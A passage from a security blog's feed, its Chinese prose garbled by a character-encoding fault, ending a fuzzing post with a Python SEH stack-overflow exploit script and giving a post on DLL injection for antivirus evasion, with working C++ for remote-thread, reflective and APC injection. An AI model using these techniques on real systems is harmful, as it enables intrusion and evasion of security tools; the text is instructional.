@@</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/ec9214e2a5aada0ddc6e74f956f60bf9.png" alt="image-20230719140624246" /></p><p>ç¬é—´æ‰¾åˆ°ä¸€ä¸ªcrash</p><h2 id="poc"><a class="markdownIt-Anchor" href="#poc"></a> PoC</h2><p><img src="https://img.joe1sn.top/uploads/big/80b03780c4fcd5ad58467691a3664471.png" alt="image-20230719140746701" /></p><p>ä½¿ç”¨x32dbgè¿›è¡Œè°ƒè¯•</p><p><img src="https://img.joe1sn.top/uploads/big/ce1aa16c4a51fe8d5fe578c891edc509.png" alt="image-20230719141111547" /></p><p>åˆšå¥½ä¿®æ”¹äº†EBPå¯„å­˜å™¨å¯¼å‡ºé”™è¯¯ï¼Œå¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºã€‚</p><p>å…·ä½“çš„EXPæ„é€ æ–¹æ³•å°±æ˜¯ä½¿ç”¨SEHåŠ è½½shellcodeï¼Œå…·ä½“çš„åœ¨ä¹‹å‰çš„æ–‡ç« å·²ç»å†™è¿‡äº†</p><p>å†™å‡ºexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x12c</span>-<span class="built_in">len</span>(shellcode)-<span class="number">32</span>) <span class="comment">#0x1c</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\x9A\x24\x40\x00&quot;</span>    <span class="comment">#40249A</span></span><br><span class="line">self_gadget = <span class="string">b&quot;\x89\xE0\x05\x24\x06\x00\x00\xFF\xE0&quot;</span></span><br><span class="line">payload = <span class="string">b&quot;\xaa&quot;</span>*<span class="number">32</span>+shellcode+offset+NSEH+gadget+self_gadget</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/04b0986fd3905d3622d739c4a5e3813d.gif" alt="output" /></p><h1 id="å‚è€ƒ"><a class="markdownIt-Anchor" href="#å‚è€ƒ"></a> å‚è€ƒ</h1><p><a href="https://paper.seebug.org/323/">https://paper.seebug.org/323/</a></p><p><a href="https://bbs.kanxue.com/thread-261323.htm">https://bbs.kanxue.com/thread-261323.htm</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;åœ¨21å¹´çš„æ—¶å€™æ›¾ç»å°å°çš„ä½¿ç”¨äº†ä¸€ç‚¹WinAFLï¼Œç°åœ¨å†å›è¿‡å¤´æ¥åšç¬”è®°&lt;/p&gt;
&lt;p&gt;è¿™é‡Œä¸»è¦è®²è¿°WinAFL+DynamoRIOçš„Fuzzæ–¹æ³•&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/categories/CVE/"/>
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/tags/CVE/"/>
    
    <category term="fuzz" scheme="https://joe1sn.eu.org/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>ã€å…æ€ã€‘DLLæ³¨å…¥å°ç»“</title>
    <link href="https://joe1sn.eu.org/2023/07/17/dll-injector/"/>
    <id>https://joe1sn.eu.org/2023/07/17/dll-injector/</id>
    <published>2023-07-17T11:24:51.000Z</published>
    <updated>2023-07-22T00:55:11.113Z</updated>
    
    <content type="html"><![CDATA[<p>DLL æ³¨å…¥è¿›åŒ–å²</p><span id="more"></span><h1 id="è¿œç¨‹çº¿ç¨‹è°ƒç”¨æ³¨å…¥"><a class="markdownIt-Anchor" href="#è¿œç¨‹çº¿ç¨‹è°ƒç”¨æ³¨å…¥"></a> è¿œç¨‹çº¿ç¨‹è°ƒç”¨æ³¨å…¥</h1><p>è¿™ä¸ªæ˜¯æœ€ç®€å•çš„</p><p>è¿™é‡Œæˆ‘æ¥å—çš„æ˜¯ç¨‹åºçš„è¿›ç¨‹<code>PID</code>å’Œå¾…æ³¨å…¥DLLçš„è·¯å¾„<code>szPath</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">DLLinjector::DllOnLoad</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>-&gt;<span class="built_in">Check</span>())&#123;</span><br><span class="line">wcout &lt;&lt; <span class="string">&quot;The Process or DLL file not found\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//å‘ç›®æ ‡è¿›ç¨‹å†™å…¥DLLçš„è·¯å¾„</span></span><br><span class="line">SIZE_T dwWriteSize = <span class="number">0</span>;</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, <span class="keyword">this</span>-&gt;dwPid);</span><br><span class="line">LPVOID pAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pAddress, <span class="keyword">this</span>-&gt;szPath, <span class="built_in">wcslen</span>(<span class="keyword">this</span>-&gt;szPath)*<span class="number">2</span>+<span class="number">2</span>, &amp;dwWriteSize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ä»ntdllå¯¼å‡º LoadLibraryA å‡½æ•°</span></span><br><span class="line">HMODULE Ntdll = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">LPVOID LoadLibraryBase = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    </span><br><span class="line">HANDLE hRemoteProcess = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)LoadLibraryW,pAddress,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hRemoteProcess, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//é‡Šæ”¾èµ„æº</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pAddress, <span class="number">0x300</span>, MEM_COMMIT);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="built_in">FreeModule</span>(Ntdll);</span><br><span class="line"></span><br><span class="line">wcout &lt;&lt; <span class="string">&quot;injection complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/ab29867d886c12b9b42013810ad19cbc.png" alt="image-20230717205213381" /></p><h1 id="åå°„dllæ³¨å…¥"><a class="markdownIt-Anchor" href="#åå°„dllæ³¨å…¥"></a> åå°„DLLæ³¨å…¥</h1><p>è¿™é‡Œæ‰¾äº†ä¸€å¼ å…ˆçŸ¥çš„å›¾ï¼Œä¸Šé¢è¯´äº†åå°„DLLæ³¨å…¥çš„æµç¨‹ï¼ŒåŸæ–‡åœ¨è¿™é‡Œ<a href="https://xz.aliyun.com/t/11072">https://xz.aliyun.com/t/11072</a></p><p><img src="https://img.joe1sn.top/uploads/big/8ac2e3d0d3139da37de7067a9a9d8e51.png" alt="image-20230717210533079" /></p><p>æœ€å¤§çš„åŒºåˆ«å°±æ˜¯æˆ‘ä»¬æ²¡æœ‰ä½¿ç”¨<code>LoadLibarary</code>è¿™ä¸ªå‡½æ•°ï¼Œè€Œæ˜¯ç›¸å½“äºè‡ªå·±å†™äº†ä¸€ä¸ªDLLåŠ è½½å™¨</p><p>ä»”ç»†è§‚å¯Ÿè¿‡ç¨‹å°±çœ‹å¾—å‡ºæ¥ï¼Œ<strong>è¿œç¨‹çº¿ç¨‹è°ƒç”¨æ³¨å…¥</strong>å†™å…¥çš„æ˜¯DLLè·¯å¾„ï¼Œç„¶ååˆ›å»ºè¿œç¨‹è°ƒç”¨<code>LoadLibarary</code>ï¼ˆLPTHREAD_START_ROUTINEï¼‰</p><p><strong>åå°„DLLæ³¨å…¥</strong>æ˜¯å°†æ•´ä¸ªæ–‡ä»¶è§£æè¿‡åï¼Œè·å¾—å¿…è¦çš„dllå¥æŸ„å’Œå‡½æ•°ä¸ºä¿®å¤å¯¼å…¥è¡¨åšå‡†å¤‡ï¼Œåˆ†é…ä¸€å—æ–°å†…å­˜å»å–è§£ædllï¼Œå¹¶æŠŠpeå¤´å¤åˆ¶åˆ°æ–°å†…å­˜ä¸­å’Œå°†å„èŠ‚å¤åˆ¶åˆ°æ–°å†…å­˜ä¸­ï¼Œä¿®å¤å¯¼å…¥è¡¨å’Œé‡å®šå‘è¡¨ï¼Œæ‰§è¡ŒDllMain()å‡½æ•°ã€‚</p><p>ç¾¤é‡ŒèŠåˆ°äº†è¿›ç¨‹è¿ç§»æŠ€æœ¯ï¼Œmsfä¸Šçš„migrateåŸç†å°±æ˜¯åå°„DLLæ³¨å…¥</p><ol><li><p>è¯»å–metsrv.dllï¼ˆmetpreter payloadæ¨¡æ¿dllï¼‰æ–‡ä»¶åˆ°å†…å­˜ä¸­ã€‚</p></li><li><p>ç”Ÿæˆæœ€ç»ˆçš„payloadã€‚</p><p>a) msfç”Ÿæˆä¸€å°æ®µæ±‡ç¼–migrate stubä¸»è¦ç”¨äºå»ºç«‹socketè¿æ¥ã€‚</p><p>b) å°†metsrv.dllçš„doså¤´ä¿®æ”¹ä¸ºä¸€å°æ®µæ±‡ç¼–meterpreter_loaderä¸»è¦ç”¨äºè°ƒç”¨reflective loaderå‡½æ•°å’Œdllmainå‡½æ•°ã€‚åœ¨metsrv.dllçš„config blockåŒºå¡«å……meterpreterå»ºç«‹sessionæ—¶çš„é…ç½®ä¿¡æ¯ã€‚</p><p>c) æœ€åå°†migrate stubå’Œä¿®æ”¹åçš„metsrv.dllæ‹¼æ¥åœ¨ä¸€èµ·ç”Ÿæˆæœ€ç»ˆçš„payloadã€‚</p></li><li><p>å‘msf serverå‘é€migrateè¯·æ±‚å’Œpayloadã€‚</p></li><li><p>msfå‘è¿ç§»ç›®æ ‡è¿›ç¨‹åˆ†é…ä¸€å—å†…å­˜å¹¶å†™å…¥payloadã€‚</p></li><li><p>msfé¦–å…ˆä¼šåˆ›å»ºçš„è¿œç¨‹çº¿ç¨‹æ‰§è¡Œmigrate stubï¼Œå¦‚æœå¤±è´¥äº†ï¼Œå°±ä¼šå°è¯•ç”¨apcæ³¨å…¥çš„æ–¹å¼æ‰§è¡Œmigrate stubã€‚migrate stubä¼šè°ƒç”¨meterpreter loaderï¼Œmeterpreter loaderæ‰ä¼šè°ƒç”¨reflective loaderã€‚</p></li><li><p>reflective loaderè¿›è¡Œåå°„å¼dllæ³¨å…¥ã€‚</p></li><li><p>æœ€åmsf clientå’Œmsf serverå»ºç«‹ä¸€ä¸ªæ–°çš„sessionã€‚</p></li></ol><p>è¿™é‡Œå°±ä¸è‡ªå·±å†™äº†ï¼Œå‚è€ƒçš„æ˜¯<a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a></p><p>é¦–å…ˆéœ€è¦æè¿°çš„å°±æ˜¯DLLçš„è§£æè¿‡ç¨‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( !hProcess  || !lpBuffer || !dwLength )</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check if the library has a ReflectiveLoader...</span></span><br><span class="line">dwReflectiveLoaderOffset = <span class="built_in">GetReflectiveLoaderOffset</span>( lpBuffer );</span><br><span class="line"><span class="keyword">if</span>( !dwReflectiveLoaderOffset )</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// alloc memory (RWX) in the host process for the image...</span></span><br><span class="line">lpRemoteLibraryBuffer = <span class="built_in">VirtualAllocEx</span>( hProcess, <span class="literal">NULL</span>, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); </span><br><span class="line"><span class="keyword">if</span>( !lpRemoteLibraryBuffer )</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// write the image into the host process...</span></span><br><span class="line"><span class="keyword">if</span>( !<span class="built_in">WriteProcessMemory</span>( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, <span class="literal">NULL</span> ) )</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// add the offset to ReflectiveLoader() to the remote library address...</span></span><br><span class="line">lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );</span><br><span class="line"></span><br><span class="line"><span class="comment">// create a remote thread in the host process to call the ReflectiveLoader!</span></span><br><span class="line">hThread = <span class="built_in">CreateRemoteThread</span>( hProcess, <span class="literal">NULL</span>, <span class="number">1024</span>*<span class="number">1024</span>, lpReflectiveLoader, lpParameter, (DWORD)<span class="literal">NULL</span>, &amp;dwThreadId );</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span>( <span class="number">0</span> );</span><br></pre></td></tr></table></figure><p><code>lpBuffer</code>å°±æ˜¯è¯»å–åˆ°å†…å­˜ä¸­çš„DLLçš„æ•°æ®</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// uiNameArray = the address of the modules export directory entry</span></span><br><span class="line">uiNameArray = (UINT_PTR)&amp;((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the File Offset of the export directory</span></span><br><span class="line">uiExportDir = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the File Offset for the array of name pointers</span></span><br><span class="line">uiNameArray = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNames, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the File Offset for the array of addresses</span></span><br><span class="line">uiAddressArray = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the File Offset for the array of name ordinals</span></span><br><span class="line">uiNameOrdinals = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNameOrdinals, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// get a counter for the number of exported functions...</span></span><br><span class="line">dwCounter = ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;NumberOfNames;</span><br><span class="line"></span><br><span class="line"><span class="comment">// loop through all the exported functions to find the ReflectiveLoader</span></span><br><span class="line"><span class="keyword">while</span>( dwCounter-- )</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> * cpExportedFunctionName = (<span class="type">char</span> *)(uiBaseAddress + <span class="built_in">Rva2Offset</span>( <span class="built_in">DEREF_32</span>( uiNameArray ), uiBaseAddress ));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">strstr</span>( cpExportedFunctionName, <span class="string">&quot;ReflectiveLoader&quot;</span> ) != <span class="literal">NULL</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// get the File Offset for the array of addresses</span></span><br><span class="line">uiAddressArray = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// use the functions name ordinal as an index into the array of name pointers</span></span><br><span class="line">uiAddressArray += ( <span class="built_in">DEREF_16</span>( uiNameOrdinals ) * <span class="built_in">sizeof</span>(DWORD) );</span><br><span class="line"></span><br><span class="line"><span class="comment">// return the File Offset to the ReflectiveLoader() functions code...</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">Rva2Offset</span>( <span class="built_in">DEREF_32</span>( uiAddressArray ), uiBaseAddress );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// get the next exported function name</span></span><br><span class="line">uiNameArray += <span class="built_in">sizeof</span>(DWORD);</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the next exported function name ordinal</span></span><br><span class="line">uiNameOrdinals += <span class="built_in">sizeof</span>(WORD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p><code>GetReflectiveLoaderOffset</code>å°±æ˜¯è§£ææ–‡ä»¶å¤´æ‰¾åˆ°DLLçš„å¯¼å‡ºè¡¨ï¼Œå¦‚æœå‘ç°<code>ReflectiveLoader</code>çš„å‡½æ•°ï¼Œé‚£ä¹ˆè¿”å›åœ¨<code>hProcess</code>çš„å†…å­˜æ–‡ä»¶ä¸­çš„ä½ç½®</p><p>ç„¶åå›åˆ°<code>LoadRemoteLibraryR</code>ä½¿ç”¨<code>CreateRemoteThread</code>è¿›è¡Œæ³¨å…¥</p><p>å…³äºRVAå’ŒVAçš„è®¡ç®—å¯ä»¥å‚è€ƒæˆ‘å¾ˆæ—©å†™çš„ä¸€ç¯‡åšå®¢ï¼š<a href="https://www.jianshu.com/p/231206f9fbaf">PEæ–‡ä»¶ç»“æ„ä¸­çš„RVAä¸RAW</a></p><p>ç°åœ¨å¯ä»¥çœ‹ä¸€ä¸‹ä»–çš„DLLæ˜¯å¦‚ä½•æ„é€ çš„</p><p>é¦–å…ˆå­˜åœ¨ä¸€ä¸ªå¯¼å‡ºå‡½æ•°</p><p><img src="https://img.joe1sn.top/uploads/big/5f38a3c3481e227dd4bc7785f3ab41ca.png" alt="image-20230718084605818" /></p><p>é€šè¿‡é˜…è¯»è¿™ä¸ªå‡½æ•°çš„ä»£ç å‘ç°</p><ol><li>ä½¿ç”¨<code>_ReturnAddress</code>è·å¾—è°ƒç”¨å®Œæˆçš„è¿”å›åœ°å€ï¼Œåæ¨åˆDLLçš„åŸºåœ°å€</li><li>é€šè¿‡PEBå¾—åˆ°<code>LoadLibraryA</code>ã€<code>GetProcAddress</code>ã€<code>VirtualAlloc</code>ï¼Œä½¿ç”¨<code>NtFlushInstructionCache</code>æš‚æ—¶å­˜å‚¨å…¶ä»–å¯¼å…¥è¡¨çš„å‡½æ•°</li><li>è¿ç§»ä¹‹å‰çš„DLLé•œåƒåˆ°æ–°çš„ä½ç½®</li><li>è¦†å†™è¿ç§»åçš„æ–‡ä»¶å¤´çš„èŠ‚åŒºä½ç½®</li><li>ä½¿ç”¨åˆšæ‰å¯¼å…¥çš„<code>LoadLibraryA</code>ã€<code>GetProcAddress</code>ä¿®å¤IAT</li><li>å¤„ç†é‡å®šå‘ç›¸å…³</li><li>æ‰¾åˆ°DLLMainå¹¶è·³è½¬åæ‰§è¡Œ</li></ol><h1 id="apcæ³¨å…¥"><a class="markdownIt-Anchor" href="#apcæ³¨å…¥"></a> APCæ³¨å…¥</h1><p>åœ¨æœ€å¼€å§‹çš„è¿œç¨‹çº¿ç¨‹è°ƒç”¨æ³¨å…¥ä½¿ç”¨çš„æ˜¯<code>TH32CS_SNAPPROCESS</code>ï¼Œè¿™é‡Œå°±æ˜¯åˆ©ç”¨<code>KiUserDispatch</code>è°ƒåº¦è¿›è¡ŒAPCä¾‹ç¨‹è°ƒç”¨ï¼Œè®©çº¿ç¨‹ä½¿ç”¨<code>LoadLibarary</code>è¿›è¡Œæ³¨å…¥</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">THREADENTRY32 te = &#123; <span class="built_in">sizeof</span>(THREADENTRY32) &#125;;</span><br><span class="line">HANDLE hThreadSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hThreadSnap) &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Error In APC Injection\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">BOOL bStat = FALSE;</span><br><span class="line"><span class="comment">//å¾—åˆ°ç¬¬ä¸€ä¸ªçº¿ç¨‹</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Thread32First</span>(hThreadSnap, &amp;te)) &#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (te.th32OwnerProcessID == <span class="keyword">this</span>-&gt;dwPid) &#123;</span><br><span class="line">HANDLE hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);</span><br><span class="line"><span class="keyword">if</span> (hThread) &#123;</span><br><span class="line">DWORD dwRet = <span class="built_in">QueueUserAPC</span>((PAPCFUNC)LoadLibraryW, hThread, (ULONG_PTR)pAddress);</span><br><span class="line"><span class="keyword">if</span> (dwRet &gt; <span class="number">0</span>)bStat = TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(hThreadSnap, &amp;te));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThreadSnap);</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/54c47164be9d9b6e6bf4a8a34377b787.png" alt="image-20230718092010464" /></p><p>è¿˜æœ‰ä¸€ä¸ªæŠ€å·§å°±æ˜¯ä½¿ç”¨NTDLLä¸­çš„æœªå¯¼å‡ºå‡½æ•°<code>NtTestAlert</code>å°±å¯ä»¥ç«‹å³è°ƒç”¨APCä¾‹ç¨‹</p><p><strong>ä¸Šé¢çš„æŠŠ<code>hProcess = GetCurrentProcess()</code>ï¼Œ<code>pAddress = shellcode_Address</code>ç›¸å½“äºä½¿ç”¨DLLæ³¨å…¥è¿›è¡Œå…æ€äº†</strong></p><h1 id="ä¸Šä¸‹æ–‡æ³¨å…¥"><a class="markdownIt-Anchor" href="#ä¸Šä¸‹æ–‡æ³¨å…¥"></a> ä¸Šä¸‹æ–‡æ³¨å…¥</h1><p>ä¹‹å‰åœ¨å†™PEåŠ è½½å™¨çš„æ—¶å€™å°±æƒ³åˆ°äº†è¿™ä¸ªï¼Œä¸»è¦æ˜¯é€šè¿‡æš‚åœç¨‹åºï¼Œè·å¾—å¹¶ä¿®æ”¹ä¸Šä¸‹æ–‡ï¼Œåœ¨å†…å­˜ä¸­å†™å…¥shellcodeï¼Œç„¶åå†æ¢å¤å°±è¡Œäº†</p><p>é—®é¢˜åœ¨äºshellcodeè¿˜æœ‰è®¡ç®—å„ç§åç§»ï¼Œä¸ªäººè§‰å¾—æ¶‰åŠshellcodeå’Œæ±‡ç¼–è¾ƒå¤šï¼Œå°±ä¸å†æœ¬ç¯‡æ–‡ç« èµ˜è¿°</p><p>ç”¨åˆ°çš„ä¸»è¦WINAPIå°±æ˜¯</p><ol><li>åˆ›å»ºä¼šshellcodeè£¸å‡½æ•°ï¼ˆ<code>__declspec(naked)</code>ï¼‰,å¯¼å‡º<code>LoadLibrary</code>ç­‰å‡½æ•°</li><li><code>OpenProcess</code>åå†<code>OpenThread</code>ï¼Œä½¿ç”¨<code>SuspendThread</code>æš‚åœçº¿ç¨‹</li><li>åˆ›å»ºç±»å‹ä¸º<code>CONTEXT</code>çš„å˜é‡ï¼Œåˆå§‹åŒ–<code>context.ContextFlags=CONTEXT_FULL</code></li><li><code>GetThreadContext</code>è·å¾—ä¸Šä¸‹æ–‡</li><li><code>VirualAlloc</code>è·å¾—ç©ºé—´ï¼Œç±»ä¼¼<code>RtlMoveMemory</code>è¿™ç§å¤åˆ¶shellcodeåˆ°ç©ºé—´</li><li>å°†<code>context.eip = shellcode_addr</code>ï¼Œä½¿ç”¨<code>SetThreadContext</code>é‡æ–°è®¾ç½®ä¸Šä¸‹æ–‡ï¼Œ<code>ResumeThread</code>æ¢å¤çº¿ç¨‹</li></ol><p>å†…æ ¸ä¸­çš„è¿‡ç¨‹å·®ä¸å¤šï¼Œä¸è¿‡æ›´å¤šçš„æ˜¯ä¸ä¸€æ ·çš„API</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;DLL æ³¨å…¥è¿›åŒ–å²&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="malware" scheme="https://joe1sn.eu.org/tags/malware/"/>
    
    <category term="C" scheme="https://joe1sn.eu.org/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>ã€Win Pwnã€‘åŸºç¡€æ ˆæº¢å‡ºä¿æŠ¤ç»•è¿‡</title>
    <link href="https://joe1sn.eu.org/2023/07/12/win-pwn-stack2/"/>
    <id>https://joe1sn.eu.org/2023/07/12/win-pwn-stack2/</id>
    <published>2023-07-12T14:29:58.000Z</published>
    <updated>2023-07-13T12:25:05.423Z</updated>
    
